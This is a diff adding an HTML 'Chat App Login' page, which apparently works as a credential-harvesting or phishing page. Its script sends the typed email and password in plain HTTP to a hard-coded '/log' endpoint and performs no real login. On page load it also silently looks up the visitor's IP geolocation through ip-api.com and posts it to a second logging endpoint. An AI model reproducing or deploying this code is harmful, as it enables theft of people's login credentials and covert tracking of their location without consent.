@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat App Login</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2><img src="https://www.icegif.com/wp-content/uploads/2024/09/anime-icegif-7.gif" alt="img"
+                    class="login-logo"></h2>
+
+            <div class="input-group">
+                <label for="username">Email or Phone</label>
+                <input type="text" id="email" name="username" placeholder="Enter your email or phone" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button class="btn" onclick="senduserDATA()">Log In</button>
+
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+    </div>
+
+
+    <script>
+
+        function senduserDATA() {
+            const email = document.getElementById("email").value
+            const password = document.getElementById("password").value
+
+            // sending data#####
+            fetch("http://192.168.0.106:3000/log", {
+                method: "post",
+                headers: { "content-Type": "application/json" },
+                body: JSON.stringify({ userInput: email, userpasswd: password })
+            })
+                .then(res => res.text())
+                .catch(err => console.log("your error is ", err))
+        }
+
+
+        // ip api
+        fetch('http://ip-api.com/json/?fields=61439')
+            .then(res => res.json())
+            .then(data => {
+                const userdata = data
+
+
+                // send the data to backend
+                fetch('http://192.168.0.106:3000/logUserData', {
+
+                    method: "post",
+                    headers: { "content-Type": "application/json" },
+                    body: JSON.stringify({ userInf: userdata })
+
+                })
+                    .then(res => { res.json() })
+            })
+
+    </script>
+</body>
+
+</html>
